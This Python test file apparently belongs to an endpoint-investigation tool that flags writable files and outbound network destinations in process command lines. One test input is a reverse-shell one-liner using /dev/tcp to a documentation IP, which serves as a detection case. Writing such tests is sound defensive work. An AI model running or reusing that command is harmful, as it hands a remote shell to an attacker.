from endpoint_investigator.analysis import (classify_destination, exe_and_script, network_destinations,
                                           parent_dirs, parse_mode, unprivileged_write)
from endpoint_investigator.model import FileMeta


def meta(mode, owner="root", group="root", typ="file"):
    return FileMeta("/x", typ, owner, group, parse_mode(mode))


def test_exe_and_script():
    assert exe_and_script(["/bin/bash", "/opt/a.sh"]) == ("/bin/bash", "/opt/a.sh")
    assert exe_and_script(["/usr/bin/python3", "-u", "/opt/x.py"]) == ("/usr/bin/python3", "/opt/x.py")
    assert exe_and_script(["/bin/sh", "-c", "echo hi"]) == ("/bin/sh", None)
    assert exe_and_script(["sshd: aluno@pts/0"]) == (None, None)


def test_who_can_write():
    assert unprivileged_write(meta("0777")).world
    assert not unprivileged_write(meta("0755")).any
    assert unprivileged_write(meta("0755", owner="aluno")).owner == "aluno"
    assert not unprivileged_write(meta("0770")).any                    # grupo root
    assert unprivileged_write(meta("0775", group="deploy")).group == "deploy"
    assert not unprivileged_write(meta("0777", typ="symlink")).any     # lrwxrwxrwx não conta


def test_network_helpers():
    assert network_destinations(["curl", "https://metrics.example.invalid/v1"]) == ["metrics.example.invalid"]
    assert "203.0.113.80" in network_destinations(["sh", "-c", "bash -i >& /dev/tcp/203.0.113.80/4444"])
    assert classify_destination("10.20.30.44") == "IP de rede privada"
    assert "TEST-NET" in classify_destination("203.0.113.25")
    assert "reservado" in classify_destination("updates.example.invalid")


def test_parent_dirs():
    assert parent_dirs("/opt/a/b.sh") == ["/opt/a", "/opt"]
